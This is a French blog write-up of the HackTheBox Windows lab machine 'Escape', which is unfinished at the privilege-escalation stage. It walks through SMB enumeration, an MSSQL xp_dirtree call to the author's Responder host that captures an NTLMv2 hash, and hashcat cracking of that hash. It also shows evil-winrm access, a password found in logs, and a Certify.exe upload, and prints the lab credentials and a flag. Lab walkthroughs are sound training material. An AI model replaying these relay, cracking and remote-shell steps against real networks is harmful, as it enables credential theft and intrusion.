<!DOCTYPE html>
<html><head>
  <meta charset="utf-8" />
  <title>
    
      Blog de TaylorDeDordogne
      | Windows Box : Escape
    
  </title>
  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
  <meta name="description" content="" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <link
    rel="icon"
    href="/favicon_io/favicon.ico"
    type="image/x-icon"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-16x16.png"
    size="16x16"
    type="image/png"
  />
  <link
    rel="icon"
    href="/favicon_io/favicon-32x32.png"
    size="32x32"
    type="image/png"
  />

  
  <link
    rel="alternate"
    type="application/rss+xml"
    href="https://nudistbeaaach.github.io//index.xml"
    title="Blog de TaylorDeDordogne"
  />

  <link
    rel="preload"
    type="text/css"
    href="/css/rose-pine.min.css"
    integrity=""
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/rose-pine.min.css"
      integrity=""
    />
  </noscript><link rel="preconnect" href="https://fonts.googleapis.com" /><link
  rel="preconnect"
  href="https://fonts.gstatic.com"
  crossorigin
/><link
  href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;700&family=Roboto+Mono:wght@400;500;700&display=swap"
  rel="stylesheet"
/>
<link
    rel="preload"
    type="text/css"
    href="/css/toigian.min.b61aac0326c36b3a3319124f1f4ab30c8ce54f66f3ead7636cf33d56e7d0c6fa.css"
    integrity="sha256-thqsAybDazozGRJPH0qzDIzlT2bz6tdjbPM9VufQxvo="
    as="style"
    onload="this.onload=null;this.rel='stylesheet'"
  />
  <noscript>
    <link
      rel="stylesheet"
      type="text/css"
      href="/css/toigian.min.b61aac0326c36b3a3319124f1f4ab30c8ce54f66f3ead7636cf33d56e7d0c6fa.css"
      integrity="sha256-thqsAybDazozGRJPH0qzDIzlT2bz6tdjbPM9VufQxvo="
    />
  </noscript>

  
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/light.min.29febe5c26ca625f7e2913e2509889a65637f415171eb003603102dea7cc42e0.css"
    integrity="sha256-Kf6+XCbKYl9+KRPiUJiJplY39BUXHrADYDEC3qfMQuA="
  />
  <link
    rel="stylesheet"
    type="text/css"
    href="/css/dark.min.47fea451289f4f246c4875ba0aa5f6376183f220c766f5e90d15d6e48cb7b937.css"
    integrity="sha256-R/6kUSifTyRsSHW6CqX2N2GD8iDHZvXpDRXW5Iy3uTc="
  />

  <script>
    
    if (
      localStorage.theme === "dark" ||
      (!("theme" in localStorage) &&
        window.matchMedia("(prefers-color-scheme: dark)").matches)
    ) {
      document.documentElement.classList.add("dark");
    } else {
      document.documentElement.classList.remove("dark");
    }
  </script>

  
  
  <script
    defer
    src="/js/main.dfa968b06ebe7fb755eb156f7296445f20bd5ca0c82aa2eb755b1bfac4e2f294676471cf7670590073c364901a0dd5dc4b4c7b83f7a4a3c3b081f085c78fa1de.js"
    integrity="sha512-36losG6&#43;f7dV6xVvcpZEXyC9XKDIKqLrdVsb&#43;sTi8pRnZHHPdnBZAHPDZJAaDdXcS0x7g/eko8OwgfCFx4&#43;h3g=="
  ></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
  <script>
    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
  </script>
  
  
</head>
<body><header style="--layer: 10">
  <div
    aria-hidden="true"
    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
  ></div>

  <div
    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
  ><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/htb-escape/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Windows Box : Escape</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="https://nudistbeaaach.github.io//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


</div>
</header>
<main class="flex justify-center px-page-gutter py-page-top">
      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
>
  <nav>
    <ol class="flex text-md items-center">
      
  
    
  
    
  
  
  
  <li>
    
    
    <a href="/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Blog de TaylorDeDordogne</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
  <li>
    
    
    <a href="/write-ups/" class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">Write ups</a>
  </li>
  
    <li class="text-muted focus:underline focus:outline-none after:md:mx-2 after:mx-0.5">/</li>
  

  
  
  
    
  
  <li>
    
    
    <a href="/write-ups/htb-escape/" class="focus:underline focus:outline-none font-bold after:md:mx-2 after:mx-0.5">Windows Box : Escape</a>
  </li>
  

    </ol>
  </nav>
  <nav>
    <a href="https://nudistbeaaach.github.io//index.xml"
      ><svg
        width="18px"
        height="18px"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
        stroke-width="1.5"
        stroke="currentColor"
      >
        <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M12.75 19.5v-.75a7.5 7.5 0 00-7.5-7.5H4.5m0-6.75h.75c7.87 0 14.25 6.38 14.25 14.25v.75M6 18.75a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"
        />
      </svg>
    </a>
  </nav>
</div>


<article>
  <h1>Windows Box : Escape</h1>
  <time class="text-sm italic tabular-nums text-muted"
  >2023/06/15&nbsp;</time
>

  

  
    <div class="section">
      
        
        <a href="/tags/pentest/" id="tag">Pentest</a>
      
        
        <a href="/tags/hackthebox/" id="tag">HackTheBox</a>
      
    </div>
  


  
    
      <details>
        <summary>Table of contents</summary>
        <div id="toc-list"><nav id="TableOfContents">
  <ol>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#reconnaissance">Reconnaissance</a>
      <ol>
        <li><a href="#scans">Scans</a></li>
        <li><a href="#accès-à-la-base-de-données">Accès à la base de données</a></li>
      </ol>
    </li>
    <li><a href="#obtention-des-premiers-creds">Obtention des premiers creds</a>
      <ol>
        <li><a href="#relay-attack-sur-le-compte-mssql">Relay attack sur le compte MSSQL</a></li>
      </ol>
    </li>
    <li><a href="#obtention-du-foothold-sur-le-domain-controller">Obtention du foothold sur le Domain controller</a></li>
    <li><a href="#pivoting-puis-privesc">Pivoting puis privesc</a>
      <ol>
        <li><a href="#pivoting">Pivoting</a></li>
        <li><a href="#privesc">Privesc</a></li>
        <li><a href="#chantier">chantier</a></li>
      </ol>
    </li>
  </ol>
</nav></div>
      </details>
    
  
  <div class="content"><h2 id="introduction">Introduction</h2>
<p>Cette box était une machine windows de niveau medium qui permettait de privec en utilisant une vulnérabilité de type <code>ESC1</code>!
On va commencer tout de suite en lançant un scan nmap comme pour toutes les box HTB.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="scans">Scans</h3>
<p>Le scan présente bien toutes les caractéristiques d&rsquo;un <code>Domain Controller</code>, on y voit les ports <code>445</code> et <code>139</code> pour le smb, le port <code>88</code> pour le ``Kerberos 5 ticket service` et le service DNS habituel:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 04:53 EDT
</span></span><span class="line"><span class="cl">Nmap scan report for 10.10.11.202
</span></span><span class="line"><span class="cl">Host is up (0.028s latency).
</span></span><span class="line"><span class="cl">Not shown: 988 filtered tcp ports (no-response)
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-14 16:53:31Z)
</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
</span></span><span class="line"><span class="cl">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span><span class="line"><span class="cl">| Not valid before: 2023-05-13T20:58:31
</span></span><span class="line"><span class="cl">|_Not valid after:  2053-05-13T20:58:31
</span></span><span class="line"><span class="cl">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:52+00:00; +8h00m13s from scanner time.
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
</span></span><span class="line"><span class="cl">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=dc.sequel.htb
</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.sequel.htb
</span></span><span class="line"><span class="cl">| Not valid before: 2022-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_Not valid after:  2023-11-18T21:20:35
</span></span><span class="line"><span class="cl">|_ssl-date: 2023-05-14T16:54:51+00:00; +8h00m12s from scanner time.
</span></span><span class="line"><span class="cl">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl">|_clock-skew: mean: 8h00m12s, deviation: 0s, median: 8h00m12s
</span></span><span class="line"><span class="cl">| smb2-time: 
</span></span><span class="line"><span class="cl">|   date: 2023-05-14T16:54:11
</span></span><span class="line"><span class="cl">|_  start_date: N/A
</span></span><span class="line"><span class="cl">| smb2-security-mode: 
</span></span><span class="line"><span class="cl">|   311: 
</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 92.07 seconds
</span></span></code></pre></div><p>On remarque aussi un serveur <code>MSSQL</code> sur le port <code>1433</code>.</p>
<p>Après avoir simplement essayé de se connecter au serveur smb et rajouté le nom de domaine du DC dans notre hostfile, On va essayer de se connecter au smb en <code>NULL Authentication</code> avec crackmapexec. Il s&rsquo;avère que pour que la NULL Authentication fonctionne il faut que le nom d&rsquo;utilisateur ne soit pas existant sur la machine, on peut prendre un nom aléatoire et essayer de lister les shares disponibles:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cme smb 10.10.11.202 --shares -u &#39;g&#39; -p &#39;&#39;    
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [+] sequel.htb\g: 
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               [+] Enumerated shares
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               C$                              Default share
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               Public          READ            
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
</span></span></code></pre></div><p>Ok visiblement on a accès en lecture à une share inhabituelle: <code>Public</code>. On va maintenant utiliser <code>smbclient</code> pour lister les fichiers disponibles dessus:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">smbclient -N -U &#39;g&#39; //10.10.11.202/Public
</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
</span></span><span class="line"><span class="cl">smb: \&gt; dir
</span></span><span class="line"><span class="cl">  .                                   D        0  Sat Nov 19 06:51:25 2022
</span></span><span class="line"><span class="cl">  ..                                  D        0  Sat Nov 19 06:51:25 2022
</span></span><span class="line"><span class="cl">  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                5184255 blocks of size 4096. 1462488 blocks available
</span></span><span class="line"><span class="cl">smb: \&gt; get &#34;SQL Server Procedures.pdf&#34;
</span></span><span class="line"><span class="cl">getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (306.3 KiloBytes/sec) (average 306.3 KiloBytes/sec)
</span></span><span class="line"><span class="cl">smb: \&gt; exit
</span></span></code></pre></div><p>Jetons un oeil au PDF que nous venons de récupérer:</p>
<div>
    <img src="assets/PDF_bonus.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
</div>
<p>A la fin de ce dernier on tombe sur des creds de la base de données, destinés au nouveaux arrivants.</p>
<h3 id="accès-à-la-base-de-données">Accès à la base de données</h3>
<p>Pour se connecter à une base de données MSSQL sous linux il est possible d&rsquo;utiliser <code>sqsh</code> ou l&rsquo;utilitaire proposé par <code>Impacket</code>, ce que nous allons faire ici:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
</span></span><span class="line"><span class="cl">Impacket v0.10.0 - Copyright <span class="m">2022</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="o">(</span><span class="m">150</span> 7208<span class="o">)</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">SQL&gt; SELECT name FROM master.dbo.sysdatabases<span class="p">;</span>
</span></span><span class="line"><span class="cl">name                                                                                                                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------------------------------------------   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">master                                                                                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">tempdb                                                                                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">model                                                                                                                              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msdb
</span></span></code></pre></div><h2 id="obtention-des-premiers-creds">Obtention des premiers creds</h2>
<p>Ok donc il n&rsquo;y a que les bases de données par défault de MSSQL, cela ne sert à rien d&rsquo;aller chercher à l&rsquo;intérieur. Maintenant il va nous falloir d&rsquo;obtenir les creds du compte sur lequel tourne le serveur ou arriver à RCE tout de suite.</p>
<h3 id="relay-attack-sur-le-compte-mssql">Relay attack sur le compte MSSQL</h3>
<p>Malheureusement la commande <code>xp_cmdshell</code> permettant d&rsquo;exécuter des commandes n&rsquo;est pas accessible, après quelque recherches on tombe sur une méthode d&rsquo;exploitation qui permet de mettre en place une <code>Relay attack</code> à partir d&rsquo;un accès MSSQL: En utilisant la commande <code>xp_dirtree</code> qui permet d&rsquo;accéder à une resssource distante.</p>
<p>En effet si on fait en sorte que le serveur fasse une requete SMB vers un serveur que l&rsquo;on contrôle, pour s&rsquo;authentifier il enverra son hash <code>NTLMv2</code> que nous pourrons cracker en offline. On va donc lancer notre serveur SMB avec l&rsquo;outil <code>Responder</code> sur l&rsquo;interface connectée au VPN comme ceci:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo responder -I tun0
</span></span></code></pre></div><p>On lance ensuite la requete SMB vers notre machine depuis le serveur MSSQL:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">SQL&gt; xp_dirtree &#39;\\10.10.14.34\test&#39;
</span></span></code></pre></div><p>Et on obtient les hash du compte <code>sql_svc</code> sur lequel tourne le serveur:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[+] Listening for events...                                                                                                                                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Client   : 10.10.11.202
</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Username : sequel\sql_svc
</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:8795c31e953d3cb4:FA875D8F149BE0462933AF6BC3AEB7CB:01010000000000000003A987799FD901ECF16D600E6BBEFB00000000020008004F0043004F00590001001E00570049004E002D00340038004F0039004E0057003700420039004F004B0004003400570049004E002D00340038004F0039004E0057003700420039004F004B002E004F0043004F0059002E004C004F00430041004C00030014004F0043004F0059002E004C004F00430041004C00050014004F0043004F0059002E004C004F00430041004C00070008000003A987799FD90106000400020000000800300030000000000000000000000000300000F13673A0A84F1123BC030B1965AC9686C878500990100A183A4A1D42B4336C9F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330034000000000000000000
</span></span></code></pre></div><p>Et il ne reste plus qu&rsquo;à le cracker avec hashcat:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">hashcat -m 5600 sql_hash.txt /usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be0462933af6bc3aeb7cb:01010000000000000003a987799fd901ecf16d600e6bbefb00000000020008004f0043004f00590001001e00570049004e002d00340038004f0039004e0057003700420039004f004b0004003400570049004e002d00340038004f0039004e0057003700420039004f004b002e004f0043004f0059002e004c004f00430041004c00030014004f0043004f0059002e004c004f00430041004c00050014004f0043004f0059002e004c004f00430041004c00070008000003a987799fd90106000400020000000800300030000000000000000000000000300000f13673a0a84f1123bc030b1965ac9686c878500990100a183a4a1d42b4336c9f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00330034000000000000000000:REGGIE1234ronnie
</span></span><span class="line"><span class="cl">                                                          
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Mode........: 5600 (NetNTLMv2)
</span></span><span class="line"><span class="cl">Hash.Target......: SQL_SVC::sequel:8795c31e953d3cb4:fa875d8f149be04629...000000
</span></span><span class="line"><span class="cl">Time.Started.....: Thu Jun 15 11:21:43 2023 (14 secs)
</span></span><span class="line"><span class="cl">Time.Estimated...: Thu Jun 15 11:21:57 2023 (0 secs)
</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
</span></span><span class="line"><span class="cl">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 (100.00%)
</span></span><span class="line"><span class="cl">Speed.#1.........:   755.7 kH/s (1.59ms) @ Accel:512 Loops:1 Thr:1 Vec:8
</span></span><span class="line"><span class="cl">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
</span></span><span class="line"><span class="cl">Progress.........: 10700800/14344385 (74.60%)
</span></span><span class="line"><span class="cl">Rejected.........: 0/10700800 (0.00%)
</span></span><span class="line"><span class="cl">Restore.Point....: 10698752/14344385 (74.58%)
</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
</span></span><span class="line"><span class="cl">Candidates.#1....: REPIN210 -&gt; REDOCEAN22
</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Util: 62%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Started: Thu Jun 15 11:21:42 2023
</span></span><span class="line"><span class="cl">Stopped: Thu Jun 15 11:21:58 2023
</span></span></code></pre></div><h2 id="obtention-du-foothold-sur-le-domain-controller">Obtention du foothold sur le Domain controller</h2>
<p>Nickel! Maintenant il va nous falloir RCE sur le DC, on peut commencer par voir si le service <code>WinRM</code> est utilisé par le DC:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">cme winrm 10.10.11.202                                                                       
</span></span><span class="line"><span class="cl">SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
</span></span><span class="line"><span class="cl">HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
</span></span></code></pre></div><p><code>WSMan</code> est utilisé donc <code>WinRM</code> doit l&rsquo;être aussi, on va tenter de se connecter avec evil-winrm sur le compte <code>sql_svc</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">evil-winrm -u sql_svc -p REGGIE1234ronnie -i 10.10.11.202     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; whoami
</span></span><span class="line"><span class="cl">sequel\sql_svc
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; 
</span></span></code></pre></div><p>Et on obtient notre premier shell sur le DC en tant que <code>sql_svc</code>.</p>
<h2 id="pivoting-puis-privesc">Pivoting puis privesc</h2>
<h3 id="pivoting">Pivoting</h3>
<p>En fouillant à la racine du disque on trouve un dossier <code>SQLServer</code> contenant des Logs et dans l&rsquo;une d&rsquo;elle quelque chose d&rsquo;assez intéressant:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.72 spid51      Attempting to load library &#39;xpstar.dll&#39; into memory. This is an informational message only. No user action is required.
</span></span><span class="line"><span class="cl">2022-11-18 13:43:07.76 spid51      Using &#39;xpstar.dll&#39; version &#39;2019.150.2000&#39; to execute extended stored procedure &#39;xp_sqlagent_is_starting&#39;. This is an informational message only; no user action is required.
</span></span><span class="line"><span class="cl">2022-11-18 13:43:08.24 spid51      Changed database context to &#39;master&#39;.
</span></span><span class="line"><span class="cl">2022-11-18 13:43:08.24 spid51      Changed language setting to us_english.
</span></span></code></pre></div><p>L&rsquo;utilisateur <code>Ryan.Cooper</code> a essayé de se connecter et c&rsquo;est trompé en mettant son mot de passe à la place de son nom d&rsquo;utilisateur, on va pouvoir pivoter sur son compte.</p>
<p>Une fois connecté en tant que Ryan, on peut récupérer le premier flag sur son bureau: <code>2f60dd9b4e3e3deeec9373f3c70a1011</code>.</p>
<h3 id="privesc">Privesc</h3>
<p>Comme suggéré par le nom du challenge (<code>ESCcape</code>), on va s&rsquo;intéresser à cette branche là des</p>
<h3 id="chantier">chantier</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">*Evil-WinRM* PS C:\Users\Ryan.Cooper&gt; upload Certify.exe
</span></span><span class="line"><span class="cl">Info: Uploading Certify.exe to C:\Users\Ryan.Cooper\Certify.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                             
</span></span><span class="line"><span class="cl">Data: 232104 bytes of 232104 bytes copied
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Upload successful!
